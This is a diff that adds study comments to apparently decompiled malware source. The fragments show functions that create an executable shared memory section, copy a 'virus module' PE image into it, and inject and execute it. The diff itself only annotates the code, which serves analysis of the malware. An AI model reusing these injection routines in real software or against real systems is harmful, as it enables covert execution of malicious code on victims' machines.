@@ -19,7 +19,7 @@
 #include "CodeBlock.h"
 
 // 98% (C) CODE MATCH
-INT32 BLOCK4_InjectAndExecuteVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader)
+INT32 BLOCK4_InjectAndExecuteVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader) //defined in define.h, defines image of ASM code blocks (segments and their addresses and sizes, ExecuteLibrary?, VirusModuleSection?, AlignAddresses?)
 {
 	HANDLE hThread; // [sp+0h] [bp-98h]@8
 	HMODULE pVirusModule; // [sp+4h] [bp-94h]@5
@@ -187,7 +187,7 @@ __declspec(naked) void BLOCK4_memcpy(void *pDestination, const void *pSource, un
 		mov     edi, pDestination
 		mov     esi, pSource
 		mov     ecx, iSize
-		rep movsb
+		rep movsb //REP: repeat string op ECX times; MOVSB: mov string byte from ds:esi to es:edi and (in/de)crement (based on flag)
 		pop     edi
 		pop     esi
 		pop     ebp
@@ -199,7 +199,7 @@ __declspec(naked) void BLOCK4_memcpy(void *pDestination, const void *pSource, un
 void BLOCK4_CopyDataIntoMapView(PVOID pVirusModule, PIMAGE_NT_HEADERS pImageNT, LPVOID pMapViewOfFile)
 {
 	// Copy them headers first
-	BLOCK4_memcpy(pMapViewOfFile, pVirusModule, pImageNT->OptionalHeader.SizeOfHeaders);
+	BLOCK4_memcpy(pMapViewOfFile, pVirusModule, pImageNT->OptionalHeader.SizeOfHeaders); //copying to mem map view
 
 	PIMAGE_SECTION_HEADER pCurrSection = (PIMAGE_SECTION_HEADER)((DWORD)pImageNT + pImageNT->FileHeader.SizeOfOptionalHeader + sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD));
 
@@ -269,10 +269,11 @@ INT32 BLOCK4_LoadVirusModuleInfo(PHARDCODED_ADDRESSES pHardAddrs, GENERAL_INFO_B
 
 	// ZwCreateSection(..., 0xF001F, 0, ..., 64, 0x8000000, 0)
 	iStatus = pHardAddrs->ZwCreateSection(&hSectionHandle, SECTION_ALL_ACCESS, 0, &liMaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0);
+	//create a section (shared memmory region) which we map to a view
 	if(iStatus != STATUS_SUCCESS)
 		return -11;
 
-	pMapViewOfFile = pHardAddrs->MapViewOfFile(hSectionHandle, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
+	pMapViewOfFile = pHardAddrs->MapViewOfFile(hSectionHandle, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0); //so, doesn't appear to be any actual files involved, just using map views of sections as basis of shared memory
 	if(!pMapViewOfFile)
 	{
 		pHardAddrs->ZwClose(hSectionHandle);
@@ -281,7 +282,7 @@ INT32 BLOCK4_LoadVirusModuleInfo(PHARDCODED_ADDRESSES pHardAddrs, GENERAL_INFO_B
 
 	sInfoBlock->MappedAddress = hSectionHandle;
 
-	BLOCK4_CopyDataIntoMapView(pVirusModule, pImageNT, pMapViewOfFile);
+	BLOCK4_CopyDataIntoMapView(pVirusModule, pImageNT, pMapViewOfFile); //only call
 	BLOCK4_CopyPEHeaderInfo(sInfoBlock, pImageNT, iVirusModuleSize);
 
 	pHardAddrs->UnmapViewOfFile(pMapViewOfFile);
